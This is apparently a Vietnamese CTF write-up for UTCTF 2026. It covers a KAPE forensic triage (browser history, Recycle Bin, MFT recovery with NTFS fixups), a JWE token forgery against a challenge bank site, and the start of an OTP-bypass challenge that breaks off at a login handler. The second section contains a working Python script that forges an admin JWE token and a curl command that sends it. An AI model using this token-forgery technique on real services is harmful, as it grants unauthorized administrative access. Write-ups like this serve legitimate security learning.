---
title: UTCTF 2026
description: "Top 30 — Writeup các bài Forensics & Web: KAPE triage analysis, JWE token forgery, OTP bypass"
date: 2026-02-21 00:00:00+0000
image: image.png
categories:
    - CTF
tags:
    - Forensics
    - KAPE
    - SQLite
    - MFT Recovery
    - NTFS Fixup
    - Browser Artifacts
    - JWE
    - JWT
    - RSA-OAEP
    - Token Forgery
    - OTP Bypass
weight: 25
---
## Sherlockk(R4f3lowww)

**Category:** Forensics
**Points:** 943
**Flag:** `utflag{b45k3rv1ll3-3l3m3n74ry-4r7hur_c0n4n_d0yl3}`

### Đề bài

Phân tích KAPE triage files để tìm các Indicators of Compromise (IOCs) do threat actor để lại. Có 3 checkpoint cần giải:

- **Checkpoint A:** URL đầy đủ mà threat actor download từ online text storage site
- **Checkpoint B:** Nội dung của note đã bị xóa
- **Checkpoint C:** MD5 hash của file enumeration script đã được download

Mỗi checkpoint là một file ZIP có password. Các flag con nối lại thành flag cuối.

**Triage:** Modified_KAPE_Triage_Files.zip

---

### Checkpoint A — Download URL

**Password ZIP:** URL tìm được
**Answer:** `b45k3rv1ll3`

#### Phân tích

Tìm URL trong Chrome browser history. Chrome lưu lịch sử trong SQLite database:

```
C/Users/Administrator/AppData/Local/Google/Chrome/User Data/Default/History
```

Query bảng `downloads_url_chains`:

```python
import sqlite3
conn = sqlite3.connect('History')
c = conn.cursor()
c.execute('SELECT * FROM downloads_url_chains')
# → (16, 0, 'http://pastes.io/download/nhy8LSzI')
# → (16, 1, 'https://pastes.io/download/nhy8LSzI')
```

URL cuối là redirect, URL gốc (dùng làm password): **`http://pastes.io/download/nhy8LSzI`**

File download: `C:\Users\Administrator\Downloads\nhy8LSzI.txt`

```
utflag{b45k3rv1ll3}
```

---

### Checkpoint B — Deleted Note

**Password ZIP:** Items trong note cách nhau bằng `-`
**Answer:** `3l3m3n74ry`

#### Phân tích

##### Bước 1: Xác định file note

Kiểm tra Windows Timeline database (ActivitiesCache.db):

```
C/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/ActivitiesCache.db
```

```python
conn = sqlite3.connect('ActivitiesCache.db')
c.execute("SELECT Payload FROM Activity WHERE Payload LIKE '%note%'")
# → {"displayText":"Notes.txt","description":"C:\\Users\\Administrator\\Documents\\Notes.txt"}
```

File cần tìm: `C:\Users\Administrator\Documents\Notes.txt` — đã bị xóa.

Trong Recycle Bin có:
- `$I9W158M.txt` → metadata của `Note To Self.txt` (0 bytes khi xóa)
- `$R9W158M.txt` → content của `Note To Self.txt` (trống)
- `$IR5UOFV.txt` → metadata của `Note.txt`
- `$RR5UOFV.txt` → content của `Note.txt`: `"Password is longhornHACK123*"`

Nhưng `Notes.txt` không có trong Recycle Bin → cần recover từ **MFT**.

##### Bước 2: Tìm entry trong $MFT

Tìm string `Notes.txt` (UTF-16LE) trong file `$MFT`:

```python
mft_data = open('$MFT', 'rb').read()
search = 'Notes.txt'.encode('utf-16le')
# Tìm ở offset 164847616 (record #160984)
```

MFT record tại offset `164847616` chứa `$DATA` attribute **resident** 46 bytes.

##### Bước 3: Apply NTFS Fixup

NTFS dùng Update Sequence Array (USA) để bảo vệ MFT records. Bytes tại vị trí 510-511 và 1022-1023 của mỗi record bị thay bằng fixup value. Cần restore lại giá trị gốc:

```python
record = bytearray(mft_data[164847616:164847616+1024])

usa_offset = struct.unpack_from('<H', record, 4)[0]  # = 48
usa_count  = struct.unpack_from('<H', record, 6)[0]  # = 3
usa_value  = struct.unpack_from('<H', record, usa_offset)[0]  # = 0x0011

# USA array: [check=0x0011, actual_510-511=0x2043, actual_1022-1023=0x0000]
actual_510_511   = record[usa_offset+2:usa_offset+4]  # b'\x20\x43'
actual_1022_1023 = record[usa_offset+4:usa_offset+6]  # b'\x00\x00'

# Restore
record[510:512]   = actual_510_511    # " C" → repair "- Carrots"
record[1022:1024] = actual_1022_1023
```

Không apply fixup → đọc được `b'...Cabbage\r\n-\x11\x00arrots'` (byte `C` bị thay bằng `\x11`).
Sau khi apply fixup → đọc đúng:

```
Grocery List:
- Lettuce
- Cabbage
- Carrots
```

**Password:** `Lettuce-Cabbage-Carrots`

```
utflag{3l3m3n74ry}
```

---

### Checkpoint C — File Enumeration Script MD5

**Password ZIP:** MD5 hash của file
**Answer:** `4r7hur_c0n4n_d0yl3`

#### Phân tích

File enumeration script nằm trong thư mục Downloads của Administrator:

```
C/Users/Administrator/Downloads/script.sh.sh
```

Tính MD5:

```python
import hashlib, zipfile
z = zipfile.ZipFile('Modified_KAPE_Triage_Files.zip')
data = z.read('Modified_KAPE_Triage_Files/C/Users/Administrator/Downloads/script.sh.sh')
print(hashlib.md5(data).hexdigest())
# → e86475121f231c02c4a63bd0915b9dff
```

**Password:** `e86475121f231c02c4a63bd0915b9dff`

```
utflag{4r7hur_c0n4n_d0yl3}
```

---

### Flag

```
utflag{b45k3rv1ll3-3l3m3n74ry-4r7hur_c0n4n_d0yl3}
```

Các phần của flag đều là references đến Sherlock Holmes:
- **b45k3rv1ll3** = Baskerville (The Hound of the Baskervilles)
- **3l3m3n74ry** = "Elementary, my dear Watson"
- **4r7hur_c0n4n_d0yl3** = Arthur Conan Doyle (tác giả)

## Break the bank [P1c0L0]
![image](https://hackmd.io/_uploads/rkJFKgbqWl.png)

- khi mới truy cập vào trang chủ ta thấy giao diện khá nhiều chức năng, nhưng đều chỉ là dummy (`#`)
- Ta view-source thì phát hiện ra một endpoint trích xuất ra tài liệu hướng dẫn là `/resources/FNSB_InternetBanking_Guide.pdf`
![image](https://hackmd.io/_uploads/ry4r9e-9Zx.png)

- Tải file pdf về đọc thì thấy được thông tin `username&password` mà file cung cấp là `testuser&testpass123`
- Ta sẽ login với username&password ở trên để vào được hệ thống
- Sau khi login xong thì chuyển ta tới endpoint `/profile`
![image](https://hackmd.io/_uploads/SyTnqlZ9Ze.png)

- Xem qua một lượt thì thấy không có gì khả nghi, ta sẽ thử view-source để tìm thông tin hữu ích
- Và ta thấy được một đoạn CSS có chứa thông tin về `admin`
![image](https://hackmd.io/_uploads/HyhkogZcZg.png)
- Từ đây ta thấy rằng có tồn tại giao diện admin nhưng button `.btn-admin` đã bị ẩn đi do không đủ quyền
- Nếu ta truy cập tới `http://challenge.utctf.live:5926/admin` thì sẽ trả về `{"error":"Forbidden: admin subject required"}`
- Tức là hệ thống biết ta đang truy cập nhưng chặn lại vì token hiện tại không chứa `subject` là `admin`
- Kiểm tra cookie `fnsb_token` ta thấy đó không phải là JWT thông thường 
`eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.SMmDjOHeAC2vLzdkvFVxX5N9Z3jUXbKZcc5HI7lvfU5XOM7dQ7tHyhd0DmgnJVN65fvdA3krF8O5g2Td8b3F7jsNMW8DTYzywkl2sb0W0kfRzyiLbEJSzz1CyyFWljWhUjIno3Dlr095HFtzRHjrp9Xq3LKTJzsNYmXU3rPLZMeINlybePKBJNhaaWAYd2lFDdkFKTqOeX-L5X8xj8Gmg53v5ig7NjTtZi1FzIvdRbuPc6Q29TFBFlQJjbllNgFiyv0oRAENE7caERhLQa7brGbSmMybstGhQz0Z16-NBrdAxW9W74dd6PEt7VIGFw44zGsX2g_Oh46t6v0ftQDHJA.lyHyxvpNY9Jiy9RW.dBoJ1nA7IPVKxxk6X8mznCnIpKTJyJ4tLWOwXeDIGYolLk_2zKY7FEZKgsxu7PsVCcAMk4-9zlXQH2X-B2CwBfD90V18weK3OwLeDWisE2mf0HRHZI5QDz2r7q1VQyCyHXpHYz0KIt27rR2DQrJ2k-fwuXeI9W7UubvEYACYQs6HzIKEfm0lusI0VNMtBnLEmKwhdld25aEqk43FglPYU2QwFSTl_pIMY4TGLaa8wVI1Xh6HSAgVEan8_DSMrRJ1Wxp3Dymzl9iVNCyFU7EmXaeLL8ywAo_orllA_tOSnZ0xpuPLIYc63I2oTTcbmkzjfAw9P8Rzj6GM6HXo0qNrSpt8bv31wV41ec_LMQTu-wswbJA4p_CYxclbOHumJnztopI8-0knFIDo2lGgeKzoctoCA4HW1ZsblMT9lNRMEZrZnuEMkOCq-wQcY6VnE0f6bibvKZUw7AgbjmcWcmEO_Mo9FHn_JpOsRnzDzp8rt-W8SO_2qgg_YEYERbzQBXo4xzBWObtGOoLSTNUw2pR6gQkBLD6ov3rgxt-IJ7NBPc1KjvHwU3v1-asW9OAlWKyp1zLCn6nBHiWn4P7njBLGPcjy5VkGfQ0Anj2k_nzgZJEU6v70-7v-Geoi4Y_JrLHlxsr9-pA2HbOlJhbAV5-X61BhMBos8lPYklJ0lUxZcg.StTK1UT7v-92a21NG7R4sw`
- Nó là một chuỗi có 5 phần => JWE
- Header dùng thuật toán mã hoá bất đối xứng, nên ta cần phải tìm được public key
- Như đã nói ở trên thì khi login vào `username:testuser` thì tôi đã tìm ra được một endpoint công khai là `/resources/` tôi đã thử truy cập tới `http://challenge.utctf.live:5926/resources/` để xem có list ra thêm được file nào không
- thật bất ngờ là tồn tại hai file txt khác và một trong các file đó chứa public key
![image](https://hackmd.io/_uploads/SJ_Fngb5We.png)
- `memo.txt`
![image](https://hackmd.io/_uploads/rycq3lZ5Ze.png)

- `key.pem`
![image](https://hackmd.io/_uploads/BJ5shlZcWg.png)

- Từ đây ta đã có được public key nên sẽ bắt đầu exploit để vào được `admin`
- Decode header của JWT trên thì sẽ ra là `{"cty":"JWT","enc":"A256GCM","alg":"RSA-OAEP-256"}`
- Ban đầu trường `"cty": "JWT"` làm tôi nghĩ là bên trong JWE chứa một JWT khác
- Tôi đã thử bypass signature như `alg:none` hoặc `RS256->HS256` nhưng đều bị server redirect về `/login.html`
- Nhìn lại lỗi `{"error":"Forbidden: admin subject required"}` thì tôi nghĩ thằng dev đã nhầm giữa bảo mật dữ liệu và xác thức user
    - Không thể nhét JWT vào trong JWE, chỉ lấy một chuỗi JSON thuần `{"sub": "testuser"}` và dùng public key mã hoá nó thành JWE
    - Vì không có JWS bên trong, server giải mã bất cứ thứ gì nhận được. Nên nếu mã ra JSON hợp lệ thì server sẽ cho qua 

=> Vì public key là công khai nên ta có thẻ tự mã hoá một chuỗi JSON có quyền admin và gửi tới server

### Exploit
```python!
import time
import json
from jwcrypto import jwt, jwk

pem_data = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----"""

public_key = jwk.JWK.from_pem(pem_data)

now = int(time.time())
claims = json.dumps({
    "sub": "admin",
    "username": "admin",
    "role": "admin",
    "iat": now,
    "exp": now + 3600
})

jwe_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256GCM",
    "cty": "JWT"
}

jwe_token = jwt.JWT(header=jwe_header, claims=claims)
jwe_token.make_encrypted_token(public_key)

print("[+] JWE Token for Admin:\n" + jwe_token.serialize())
```

- Chạy script trên và ta có được một token JWE mới
- Sau đó ta sẽ `curl` tới endpoint `/admin` với cookie chứa token vừa gen được
``` java
curl -i -s -L http://challenge.utctf.live:5926/admin \
     -H "Cookie: fnsb_token=<JWE_TOKEN>"
```

- Server trả về `HTTP 200 OK` và giao diện của FNSB SysAdmin Console 

**FLAG: utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}**

## Time to Pretend [P1c0L0]
![image](https://hackmd.io/_uploads/HJ2H7--5-e.png)

- Ta thấy các chức năng ở trên header cũng chỉ toàn là dummy, nên ta vẫn sẽ view-source để tìm thông tin ẩn

### HTML
- Ta phát hiện ra một comment khả nghi là 
![image](https://hackmd.io/_uploads/HkDi7WWcbg.png)
![image](https://hackmd.io/_uploads/r1L67ZbcZx.png)

- Từ đây ta có thể biết là tồn tại một file là `urgent.txt` có thể truy cập được và tồn tại một debug endpoint để lấy OTP
- Truy cập tới `/urgent.txt` ta thu được tâm thư của người tên `timothy`. Đọc qua ta nhận ra thuật toán gen OTP có lỗ hổng nên đã khóa toàn bộ tài khoản trên hệ thống, ngoại trừ tài khoản của người đó để tiện theo dõi
=> Chỉ `username=timothy` mở để có thể login vào, nên ta sẽ tìm cách để login với `username=timothy`
![image](https://hackmd.io/_uploads/H11zEZZ5be.png)

- Loginc handler
```javascript!
async function doLogin() {
  const response = await fetch('/auth', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, otp })
  });
  // On success → redirect to /portal
}

```